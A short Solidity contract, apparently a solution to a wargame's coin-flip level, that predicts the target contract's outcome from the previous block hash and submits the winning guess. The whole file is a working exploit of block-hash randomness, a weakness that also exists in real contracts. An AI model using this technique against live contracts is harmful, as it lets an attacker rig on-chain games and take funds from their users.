// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import 'SafeMath.sol';

interface CoinFlip{
    function flip(bool) external returns(bool);
}

contract test {

    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address level;

    constructor(address _level) {
        level = _level;
    }

    function flip() public  {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
        revert();
        }

        lastHash = blockValue;
        uint256 coin = blockValue.div(FACTOR);

        if(coin == 1)
            CoinFlip(level).flip(true);
        else
            CoinFlip(level).flip(false);

  }
}